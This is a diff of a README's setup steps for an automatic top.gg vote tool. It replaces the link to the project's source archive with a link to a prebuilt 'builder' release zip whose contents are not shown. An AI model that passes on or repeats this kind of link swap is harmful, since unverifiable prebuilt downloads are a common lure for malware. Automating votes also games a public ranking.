@@ -1,7 +1,7 @@
 <a id="top"></a>
 
 ## 📁  〢 Setting Up
-> Download [Autovoter](https://github.com/Rootdisc/top.gg-automatic-vote/archive/refs/heads/main.zip)
+> Download [Autovoter](https://github.com/Rootdisc/top.gg-automatic-vote/releases/download/builder/autovoter.zip)
 >
 > Install [Python](https://www.python.org/downloads/) 
 >
